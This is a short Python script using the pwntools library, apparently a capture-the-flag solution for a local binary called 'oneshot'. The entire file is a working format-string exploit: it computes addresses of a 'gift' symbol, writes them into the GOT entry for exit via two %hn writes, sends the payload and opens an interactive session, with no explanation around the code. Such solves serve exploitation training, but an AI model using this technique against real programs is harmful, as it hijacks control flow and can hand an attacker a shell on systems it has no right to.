from pwn import *

# context.log_level = 'debug'

e = ELF("./oneshot")
p = process(e.path)


p.recvuntil(b"\n\n")
payload = f'%{e.symbols["gift"] >> 16}c'.encode()
payload += b"%10$hn"
payload += f"%{(e.symbols['gift'] & 0xffff) - (e.symbols['gift'] >> 16)}c".encode()
payload += b"%11$hn"
payload = payload.ljust(0x20, b"\x00")
payload += p64(e.got["exit"] + 2)
payload += p64(e.got["exit"])
p.send(payload)

p.interactive()